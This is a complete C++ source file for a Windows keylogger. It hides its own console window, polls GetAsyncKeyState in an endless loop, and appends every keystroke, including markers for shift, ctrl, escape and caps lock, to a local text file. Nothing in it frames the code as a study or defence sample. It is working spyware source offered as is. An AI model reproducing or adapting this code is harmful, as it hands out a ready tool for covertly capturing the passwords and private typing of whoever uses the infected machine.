#define _WIN32_WINNT 0x0500  // dont delete this line.
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <winuser.h>
using namespace std;

void log_char(string ch){
  /*
  Append ch to log LogFile
  */
  fstream my_log_file;
  my_log_file.open("leave_me_here.txt", fstream::app); // append mode

  if ( my_log_file.is_open()){
    my_log_file << ch;
    my_log_file.close();
  }
}

bool special_case(int key){
  /*
  Treat special case character
  check : https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
  */
  switch ( key ) {
    case VK_SPACE:
      // 0x20
      log_char(" ");
      return true;
    case VK_SHIFT:
      // 0x10
      log_char("#shift#");
      return true;
    case VK_RETURN:
      log_char("\n");
      return true;
    case VK_OEM_PERIOD:
        log_char(".");
        return true;
    case VK_OEM_COMMA:
        log_char(",");
        return true;
    case VK_OEM_MINUS:
        log_char("-");
        return true;
    case VK_CONTROL:
      // 0x11
      log_char("#CTRL#");
      return true;
    case VK_BACK:
      //0x08
      log_char("\b");
      return true;
    case VK_TAB:
      // 0x09
      log_char("\t");
      return true;
    case VK_CAPITAL:
      // 0x14
      log_char("#CAPITAL#");
      return true;
    case VK_ESCAPE:
      // 0x1B
      log_char("#ESC#");
      return true;
    default:
      return false;
  }
}

int main(){

  ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console

  char ch = 'a';

  while (true){

    for ( int ch = 8; ch < 190; ch++){
      if ( GetAsyncKeyState(ch) == -32767 ){
        if ( special_case(ch) == false ){

          fstream my_log_file;
          my_log_file.open("leave_me_here.txt", fstream::app); // append mode

          if ( my_log_file.is_open()){
            my_log_file << CHAR(ch);
            my_log_file.close();

          }
        }
      }
    }
  }
  return 0;
}
